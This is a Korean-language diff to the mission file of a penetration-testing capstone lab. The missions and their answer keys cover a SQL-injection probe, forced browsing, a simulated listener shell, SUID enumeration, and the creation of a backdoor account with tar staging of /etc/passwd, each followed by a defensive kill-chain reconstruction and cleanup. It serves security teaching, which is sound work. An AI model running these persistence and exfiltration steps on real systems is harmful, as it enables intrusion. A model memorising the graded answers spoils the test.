@@ -134,9 +134,11 @@ steps:
       curl -s -o /dev/null -w 'sqli=%{http_code} ' -A sqlmap/1.7 "http://dvwa.el34.lab/?id=pt15%27%20UNION%20SELECT%201--"
       # 2) 강제 브라우징 — juice.el34.lab /ftp 접근(DetectionOnly라 200 열림)
       curl -s -o /dev/null -w 'ftp=%{http_code}\n' http://juice.el34.lab/ftp
-      # 3) 해석 — SQLi(dvwa 403 탐지) + 강제 브라우징(/ftp 200) = 익스플로잇 표면
-      echo "→ SQLi(dvwa 403 탐지) + 강제 브라우징(/ftp 200). 익스플로잇 표면"
       ```
+      sqli=403(dvwa WAF 차단=탐지) vs ftp=200(juice 강제 브라우징 열림)의 대비가 침투 경로 정보다 —
+      막힌 문(SQLi) 대신 열린 문(/ftp)으로 들어간다.
+      > 💡 **화면으로 확인:** 브라우저에서 `http://juice.el34.lab/ftp` 를 열면 UI 에 없던 디렉토리 목록이 그대로
+      > 뜬다(200). SQLi 는 스캐너 UA(sqlmap/1.7)까지 재현하려면 **Burp Repeater** 로 User-Agent 를 바꿔 보내 403 을 확인한다.
 
       ## ✅ 합격 기준
       `ftp=200` 출력 시 통과. **근거:** /ftp 강제 브라우징이 200(열림)으로 응답하면 침투 경로가
@@ -149,12 +151,9 @@ steps:
       ssh att@192.168.0.202 "curl -s -o /dev/null -w 'sqli=%{http_code} ' -A sqlmap/1.7 \"http://dvwa.el34.lab/?id=pt15%27%20UNION%20SELECT%201--\""
       # 2) 강제 브라우징 — juice.el34.lab /ftp 접근(DetectionOnly라 200 열림)
       ssh att@192.168.0.202 "curl -s -o /dev/null -w 'ftp=%{http_code}\n' http://juice.el34.lab/ftp"
-      # 3) 해석 — SQLi(dvwa 403 탐지) + 강제 브라우징(/ftp 200) = 익스플로잇 표면
-      echo "→ SQLi(dvwa 403 탐지) + 강제 브라우징(/ftp 200). 익스플로잇 표면"
     answer_detail: "취약점 분석 — SQLi(W04)+강제 브라우징(W06). 침투 경로 선택."
     expected_output: |
       sqli=403 ftp=200
-      → SQLi(dvwa 403 탐지) + 강제 브라우징(/ftp 200). 익스플로잇 표면
     verify:
       type: output_contains
       expect: 'ftp=200'
@@ -180,48 +179,40 @@ steps:
 
       ```bash
       # 1) 셸 거점 모사 — 백그라운드 리스너(포트 51515) 기동
-      nohup python3 -m http.server 51515 >/dev/null 2>&1 & echo shell
-      # 2) 리스너가 뜰 시간 잠깐 확보
-      sleep 1
-      # 3) osquery listening_ports로 51515 리스너 확인(방어자 시점 가시화)
-      osqueryi --json 'SELECT pid,port FROM listening_ports WHERE port=51515;'
-      # 4) 리스너 즉시 정리([h]ttp 자기매칭 회피) 후 셸 확보 표지
-      pkill -f "[h]ttp.server 51515" 2>/dev/null; true
-      echo "shell captured 51515"
+      nohup python3 -m http.server 51515 >/dev/null 2>&1 &
+      # 2) 리스너가 뜰 때까지 대기 — 고정 sleep 대신 포트가 열리면 즉시 진행(조건 폴링, 최대 5초)
+      timeout 5 bash -c 'until ss -tlnp | grep -q :51515; do :; done'
+      # 3) 포트 51515를 듣는 프로세스(pid) 확인 = 코드 실행 거점(셸) 확보
+      ss -tlnp | grep ':51515'
+      # 4) 리스너 즉시 정리([h]ttp 자기매칭 회피)
+      pkill -f "[h]ttp.server 51515"
       ```
+      `ss -tlnp` 출력에 포트 51515 와 주인 프로세스(pid)가 보이면 임의 프로세스를 띄울 수 있었다는 뜻 = 셸
+      확보다. 공유 인프라라 확인 직후 pkill 로 정리한다(방어자는 osquery `listening_ports` 로도 같은 포트를 본다).
 
       ## ✅ 합격 기준
-      `51515` 출력 시 통과. **근거:** osquery listening_ports 에 51515 리스너가 잡히고 "shell captured
-      51515"가 출력되면 코드 실행 거점(셸) 확보 — 확인 즉시 리스너를 정리한다.
+      `51515` 출력 시 통과. **근거:** ss 로 포트 51515 리스너(pid)가 잡히면 코드 실행 거점(셸) 확보 —
+      고정 sleep 대신 조건 폴링으로 포트가 뜰 때까지 기다렸다 확인하고, 확인 즉시 리스너를 정리한다.
     hint: '리스너 51515'
     category: manipulation
     points: 12
     answer: |
-      # 1) 셸 거점 모사 — 백그라운드 리스너(포트 51515) 기동
-      ssh ccc@10.20.32.80 'nohup python3 -m http.server 51515 >/dev/null 2>&1 & echo shell'
-      # 2) 리스너가 뜰 시간 잠깐 확보
-      sleep 1
-      # 3) osquery listening_ports로 51515 리스너 확인(방어자 시점 가시화)
-      ssh ccc@10.20.32.80 "ss -tlnp 2>/dev/null | grep ':51515' || echo 'port 51515 not listening'"
-      # 4) 리스너 즉시 정리([h]ttp 자기매칭 회피) 후 셸 확보 표지
-      ssh ccc@10.20.32.80 'pkill -f "[h]ttp.server 51515" 2>/dev/null; true'
-      echo "shell captured 51515"
-    answer_detail: "익스플로잇 = 코드 실행 거점(셸 51515) 확보. W08 CTF 패턴."
+      # ⑤ 익스플로잇 — 리스너 기동 → 조건 폴링 대기 → ss로 51515 확인 → self-clean(한 세션 원자 실행)
+      ssh ccc@10.20.32.80 'nohup python3 -m http.server 51515 >/dev/null 2>&1 &
+      timeout 5 bash -c "until ss -tlnp | grep -q :51515; do :; done"
+      ss -tlnp | grep ":51515"
+      pkill -f "[h]ttp.server 51515"'
+    answer_detail: "PTES 익스플로잇 = 코드 실행 거점(셸) 확보(W08 CTF 패턴). 비표준 포트 51515 리스너를 띄워 코드 실행을 모사하고, 고정 sleep 대신 'until ss grep -q :51515' 조건 폴링으로 리스너가 뜰 때까지 기다렸다 ss -tlnp 로 포트·pid 를 확인하면 셸 확보 입증. 방어자는 osquery listening_ports 로도 같은 포트를 본다. 출력에 51515 가 보이면 통과. 공유 인프라 보존을 위해 확인 즉시 pkill self-clean."
     expected_output: |
-      shell
-      [
-        {"pid":"53899","port":"51515"},
-        {"pid":"53899","port":"51515"}
-      ]
-      shell captured 51515
+      LISTEN 0      5            0.0.0.0:51515      0.0.0.0:*    users:(("python3",pid=53899,fd=3))
     verify:
       type: output_contains
       expect: '51515'
       field: stdout
       semantic:
         intent: "셸 캡처"
-        success_criteria: ["리스너 51515"]
-        acceptable_methods: ["**[OSS] 리스너+osquery (권장)**"]
+        success_criteria: ["리스너 51515", "ss 조건폴링 확인"]
+        acceptable_methods: ["**[OSS] 리스너+ss(조건폴링) (권장)**"]
     target_vm: web
 
   - order: 5
@@ -240,9 +231,9 @@ steps:
       ```bash
       # 1) SUID 열거 — 저권한 ccc로 root 권한 실행 파일 목록 + 그룹 멤버십(id) 확인
       echo "[SUID]"; find / -perm -4000 -type f 2>/dev/null | head -5; echo "[그룹]"; id
-      # 2) 해석 — SUID/sudo 열거 → GTFObins 매핑(W11). root 경로 탐색
-      echo "→ SUID/sudo 열거 → GTFObins 매핑(W11). root 경로 탐색"
       ```
+      SUID 목록에서 비정상 바이너리(셸/에디터/find 등)를 GTFObins 경로에 대조하면 root 후보가 나오고, id 의
+      sudo/www-data 그룹 멤버십도 상승 단서다(W11). 캡스톤은 열거까지만 하고 실제 root 상승은 개념으로 남긴다(읽기전용).
 
       ## ✅ 합격 기준
       `SUID` 출력 시 통과. **근거:** [SUID] 표지와 함께 root 권한 실행 파일 목록·그룹 멤버십이
@@ -253,8 +244,6 @@ steps:
     answer: |
       # 1) SUID 열거 — 저권한 ccc로 root 권한 실행 파일 목록 + 그룹 멤버십(id) 확인
       ssh ccc@10.20.32.80 'echo "[SUID]"; find / -perm -4000 -type f 2>/dev/null | head -5; echo "[그룹]"; id'
-      # 2) 해석 — SUID/sudo 열거 → GTFObins 매핑(W11). root 경로 탐색
-      echo "→ SUID/sudo 열거 → GTFObins 매핑(W11). root 경로 탐색"
     answer_detail: "권한 상승 — SUID/sudo 열거(W11) → GTFObins로 root. 캡스톤은 열거까지(실제 상승은 읽기전용)."
     expected_output: |
       [SUID]
@@ -265,7 +254,6 @@ steps:
       /usr/bin/chsh
       [그룹]
       uid=1000(ccc) gid=1000(ccc) groups=1000(ccc),27(sudo),33(www-data)
-      → SUID/sudo 열거 → GTFObins 매핑(W11). root 경로 탐색
     verify:
       type: output_contains
       expect: 'SUID'
@@ -291,12 +279,12 @@ steps:
 
       ```bash
       # 1) persistence + staging — 백도어 계정 pt15ghost 생성 + 민감 파일 tar로 유출 준비
-      userdel -r pt15ghost 2>/dev/null; useradd -m -s /bin/bash pt15ghost; tar czf /tmp/pt15_exfil.tar.gz /etc/passwd /etc/hostname 2>/dev/null; echo "persist+exfil"
+      sudo userdel -r pt15ghost >/dev/null 2>&1; sudo useradd -m -s /bin/bash pt15ghost; tar czf /tmp/pt15_exfil.tar.gz -C / etc/passwd etc/hostname; echo "persist+exfil"
       # 2) 발판 확인 — osquery users로 백도어 계정 pt15ghost 조회
-      osqueryi --json 'SELECT username,uid FROM users WHERE username="pt15ghost";'
-      # 3) 해석 — 백도어 계정(W12) + 데이터 staging(W12 UEBA)
-      echo "→ 백도어 계정(pt15ghost, W12) + 데이터 staging(exfil, W12 UEBA)"
+      sudo osqueryi --json 'SELECT username,uid FROM users WHERE username="pt15ghost";'
       ```
+      osquery users 에 pt15ghost 가 잡히면 persistence(백도어 계정, T1136 W12) + 유출 staging(민감 파일 tar,
+      W12 UEBA)의 포스트 익스플로잇이 완료된 것 — 침투를 "끊기지 않는 접근 + 데이터 탈취"로 굳혔다(미션 9에서 self-clean).
 
       ## ✅ 합격 기준
       `pt15ghost` 출력 시 통과. **근거:** osquery users 조회에 백도어 계정 pt15ghost 가 잡히면
@@ -306,18 +294,15 @@ steps:
     points: 12
     answer: |
       # 1) persistence + staging — 백도어 계정 pt15ghost 생성 + 민감 파일 tar로 유출 준비
-      ssh ccc@10.20.32.80 'sudo userdel -r pt15ghost 2>/dev/null; sudo useradd -m -s /bin/bash pt15ghost; tar czf /tmp/pt15_exfil.tar.gz /etc/passwd /etc/hostname 2>/dev/null; echo "persist+exfil"'
+      ssh ccc@10.20.32.80 'sudo userdel -r pt15ghost >/dev/null 2>&1; sudo useradd -m -s /bin/bash pt15ghost; tar czf /tmp/pt15_exfil.tar.gz -C / etc/passwd etc/hostname; echo "persist+exfil"'
       # 2) 발판 확인 — osquery users로 백도어 계정 pt15ghost 조회
       ssh ccc@10.20.32.80 'sudo osqueryi --json "SELECT username,uid FROM users WHERE username=\"pt15ghost\";"'
-      # 3) 해석 — 백도어 계정(W12) + 데이터 staging(W12 UEBA)
-      echo "→ 백도어 계정(pt15ghost, W12) + 데이터 staging(exfil, W12 UEBA)"
     answer_detail: "포스트 익스플로잇 = persistence(계정)+유출(staging). W12 기법. 장악 유지+데이터 탈취."
     expected_output: |
       persist+exfil
       [
         {"uid":"1001","username":"pt15ghost"}
       ]
-      → 백도어 계정(pt15ghost, W12) + 데이터 staging(exfil, W12 UEBA)
     verify:
       type: output_contains
       expect: 'pt15ghost'
@@ -345,10 +330,10 @@ steps:
       # 1) 정찰/침투 흔적 — WAF(modsec) 감사로그에서 발화한 CRS 룰 ID(9xxxx) 추출
       echo "[정찰/침투 → WAF]"; sudo tail -120 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | head
       # 2) 발판 흔적 — osquery users로 백도어 계정 pt15ghost 확인
-      echo "[발판 → osquery]"; osqueryi --json 'SELECT username FROM users WHERE username="pt15ghost";'
-      # 3) 해석 — 정찰(913)→침투(942)→발판(pt15ghost)→유출(staging) 킬체인
-      echo "→ 정찰(913)→침투(942)→발판(pt15ghost)→유출(staging) 킬체인. 어느 단계서든 끊기"
+      echo "[발판 → osquery]"; sudo osqueryi --json 'SELECT username FROM users WHERE username="pt15ghost";'
       ```
+      WAF 룰 흔적(정찰 913·침투 942)과 osquery 의 백도어 계정 pt15ghost 를 한 타임라인으로 이으면 킬체인이
+      재구성된다 — 각 단계가 서로 다른 소스에 남고, defense in depth 면 어느 한 단계만 끊어도 킬체인 전체가 무너진다.
 
       ## ✅ 합격 기준
       `pt15ghost` 출력 시 통과. **근거:** WAF 룰 흔적(9xxxx)과 osquery 의 백도어 계정 pt15ghost 를
@@ -361,8 +346,6 @@ steps:
       echo "[정찰/침투 → WAF]"; ssh ccc@10.20.32.80 'sudo tail -120 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | head'
       # 2) 발판 흔적 — osquery users로 백도어 계정 pt15ghost 확인
       echo "[발판 → osquery]"; ssh ccc@10.20.32.80 'sudo osqueryi --json "SELECT username FROM users WHERE username=\"pt15ghost\";"'
-      # 3) 해석 — 정찰(913)→침투(942)→발판(pt15ghost)→유출(staging) 킬체인
-      echo "→ 정찰(913)→침투(942)→발판(pt15ghost)→유출(staging) 킬체인. 어느 단계서든 끊기"
     answer_detail: "방어자 킬체인 재구성 = WAF(913/942)+osquery(계정)+FIM(staging) 흔적을 한 침투로. defense in depth로 어느 단계서든 차단."
     expected_output: |
       [정찰/침투 → WAF]
@@ -397,18 +380,20 @@ steps:
       PTES 캡스톤 = W01–W14 전 기법을 한 침투로 완주하고, 방어가 킬체인 재구성으로 끊는 공방 통합.
       이를 한 문서로 정리하면 공격기법 트랙 수료.
 
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
-      ```bash
-      # 1) heredoc(<<'EOF' ... EOF)으로 PTES 캡스톤 보고서 출력 — 정찰→유출→방어 킬체인→권고→결론
-      cat <<'EOF'
-      # 공격 W15 PTES 캡스톤 보고서
-      ## 1. 정찰(nmap/ffuf)→취약점(SQLi/강제브라우징)→익스플로잇(셸 51515)
-      ## 2. 권한상승(SUID/sudo 열거)→persistence(pt15ghost)→유출(staging)
-      ## 3. 방어 킬체인: 정찰(913)→침투(942)→발판(osquery)→유출(FIM). 다층 방어로 끊기
-      ## 4. 권고: WAF 강화, 최소권한, FIM, 전수 헌팅. 어느 단계든 1곳 차단=킬체인 붕괴
-      ## 결론: PTES로 완주한 침투를 방어가 킬체인 재구성으로 끊는다. 공방 통합의 완성
-      EOF
+      ## 💻 실행 방법 — 편집기로 PTES 캡스톤 보고서 작성
+
+      **표적 web 셸:** `ssh ccc@10.20.32.80`(비번 1) 로 접속해 `nano ~/w15_ptes_report.md` 를 열고, 미션
+      1~7 을 아래 골격에 채워 저장한다(Ctrl+O 저장, Ctrl+X 종료).
+
+      ```markdown
+      # 공격 W15 — PTES 캡스톤 침투 보고서
+      ## 1. 정찰(nmap/ffuf) → 취약점(SQLi 403/강제브라우징 200) → 익스플로잇(셸 51515)
+      ## 2. 권한상승(SUID/sudo 열거) → persistence(pt15ghost) → 유출(staging)
+      ## 3. 방어 킬체인 : 정찰(913) → 침투(942) → 발판(osquery) → 유출(FIM). 다층 방어로 끊기
+      ## 4. 권고 : WAF 강화, 최소권한, FIM, 전수 헌팅. 어느 단계든 1곳 차단=킬체인 붕괴
+      ## 결론 : PTES 로 완주한 침투를 방어가 킬체인 재구성으로 끊는다. 공방 통합의 완성
       ```
+      작성 후 `cat ~/w15_ptes_report.md` 로 확인한다 — 보고서는 heredoc 출력이 아니라 편집기로 직접 쓴 산출물이다.
 
       ## ✅ 합격 기준
       `PTES` 출력 시 통과. **근거:** 보고서에 정찰→익스플로잇→privesc→persistence→유출 전 단계와
@@ -417,22 +402,24 @@ steps:
     category: report
     points: 5
     answer: |
-      cat <<'EOF'
-      # 공격 W15 PTES 캡스톤 보고서
-      ## 1. 정찰(nmap/ffuf)→취약점(SQLi/강제브라우징)→익스플로잇(셸 51515)
-      ## 2. 권한상승(SUID/sudo 열거)→persistence(pt15ghost)→유출(staging)
-      ## 3. 방어 킬체인: 정찰(913)→침투(942)→발판(osquery)→유출(FIM). 다층 방어로 끊기
-      ## 4. 권고: WAF 강화, 최소권한, FIM, 전수 헌팅. 어느 단계든 1곳 차단=킬체인 붕괴
-      ## 결론: PTES로 완주한 침투를 방어가 킬체인 재구성으로 끊는다. 공방 통합의 완성
+      # (편집기로 작성한 PTES 캡스톤 보고서 — 채점용)
+      ssh ccc@10.20.32.80 'cat > ~/w15_ptes_report.md <<'"'"'EOF'"'"'
+      # 공격 W15 — PTES 캡스톤 침투 보고서
+      ## 1. 정찰(nmap/ffuf) → 취약점(SQLi 403/강제브라우징 200) → 익스플로잇(셸 51515)
+      ## 2. 권한상승(SUID/sudo 열거) → persistence(pt15ghost) → 유출(staging)
+      ## 3. 방어 킬체인 : 정찰(913) → 침투(942) → 발판(osquery) → 유출(FIM). 다층 방어로 끊기
+      ## 4. 권고 : WAF 강화, 최소권한, FIM, 전수 헌팅. 어느 단계든 1곳 차단=킬체인 붕괴
+      ## 결론 : PTES 로 완주한 침투를 방어가 킬체인 재구성으로 끊는다. 공방 통합의 완성
       EOF
-    answer_detail: "PTES 캡스톤 = 전 기법을 한 침투로 + 방어 킬체인 재구성. 공격기법 트랙의 종합 = 수료."
+      cat ~/w15_ptes_report.md'
+    answer_detail: "편집기로 ~/w15_ptes_report.md 를 작성해 캡스톤을 종합한다. PTES 캡스톤 = W01–W14 전 기법을 한 침투로 완주(정찰→취약점→익스플로잇→권한상승→persistence→유출) + 방어가 킬체인 재구성(정찰 913→침투 942→발판 osquery→유출 FIM)으로 끊는 공방 통합. 어느 한 단계만 차단해도 킬체인이 무너진다(defense in depth). 보고서는 heredoc 출력이 아니라 편집기로 직접 쓴 산출물이라야 하며, 출력에 'PTES'가 보이면 공격기법 트랙 수료."
     expected_output: |
-      # 공격 W15 PTES 캡스톤 보고서
-      ## 1. 정찰(nmap/ffuf)→취약점(SQLi/강제브라우징)→익스플로잇(셸 51515)
-      ## 2. 권한상승(SUID/sudo 열거)→persistence(pt15ghost)→유출(staging)
-      ## 3. 방어 킬체인: 정찰(913)→침투(942)→발판(osquery)→유출(FIM). 다층 방어로 끊기
-      ## 4. 권고: WAF 강화, 최소권한, FIM, 전수 헌팅. 어느 단계든 1곳 차단=킬체인 붕괴
-      ## 결론: PTES로 완주한 침투를 방어가 킬체인 재구성으로 끊는다. 공방 통합의 완성
+      # 공격 W15 — PTES 캡스톤 침투 보고서
+      ## 1. 정찰(nmap/ffuf) → 취약점(SQLi 403/강제브라우징 200) → 익스플로잇(셸 51515)
+      ## 2. 권한상승(SUID/sudo 열거) → persistence(pt15ghost) → 유출(staging)
+      ## 3. 방어 킬체인 : 정찰(913) → 침투(942) → 발판(osquery) → 유출(FIM). 다층 방어로 끊기
+      ## 4. 권고 : WAF 강화, 최소권한, FIM, 전수 헌팅. 어느 단계든 1곳 차단=킬체인 붕괴
+      ## 결론 : PTES 로 완주한 침투를 방어가 킬체인 재구성으로 끊는다. 공방 통합의 완성
     verify:
       type: output_contains
       expect: 'PTES'
@@ -458,7 +445,7 @@ steps:
 
       ```bash
       # 1) 전 흔적 제거 + 잔재 재점검 — 계정(userdel)·staging(rm)·셸(pgrep) 각각 ok 확인
-      userdel -r pt15ghost 2>/dev/null; rm -f /tmp/pt15_exfil.tar.gz; id pt15ghost 2>/dev/null && echo "계정 잔재!" || echo "user ok"; pgrep -f "[h]ttp.server 51515" && echo "셸 잔재!" || echo "shell ok"; ls /tmp/pt15_exfil.tar.gz 2>/dev/null && echo "staging 잔재!" || echo "staging ok"
+      sudo userdel -r pt15ghost >/dev/null 2>&1; sudo rm -f /tmp/pt15_exfil.tar.gz; id pt15ghost >/dev/null 2>&1 && echo "계정 잔재!" || echo "user ok"; pgrep -f "[h]ttp.server 51515" && echo "셸 잔재!" || echo "shell ok"; ls /tmp/pt15_exfil.tar.gz >/dev/null 2>&1 && echo "staging 잔재!" || echo "staging ok"
       # 2) 정리 완료 표지
       echo "---check done---"
       ```
@@ -471,7 +458,7 @@ steps:
     points: 5
     answer: |
       # 1) 전 흔적 제거 + 잔재 재점검 — 계정(userdel)·staging(rm)·셸(pgrep) 각각 ok 확인
-      ssh ccc@10.20.32.80 'sudo userdel -r pt15ghost 2>/dev/null; sudo rm -f /tmp/pt15_exfil.tar.gz; id pt15ghost 2>/dev/null && echo "계정 잔재!" || echo "user ok"; pgrep -f "[h]ttp.server 51515" && echo "셸 잔재!" || echo "shell ok"; ls /tmp/pt15_exfil.tar.gz 2>/dev/null && echo "staging 잔재!" || echo "staging ok"'
+      ssh ccc@10.20.32.80 'sudo userdel -r pt15ghost >/dev/null 2>&1; sudo rm -f /tmp/pt15_exfil.tar.gz; id pt15ghost >/dev/null 2>&1 && echo "계정 잔재!" || echo "user ok"; pgrep -f "[h]ttp.server 51515" && echo "셸 잔재!" || echo "shell ok"; ls /tmp/pt15_exfil.tar.gz >/dev/null 2>&1 && echo "staging 잔재!" || echo "staging ok"'
       # 2) 정리 완료 표지
       echo "---check done---"
     answer_detail: "캡스톤 마무리 = 전 흔적(계정/staging/셸) self-clean. 공유 인프라 베이스 복원."
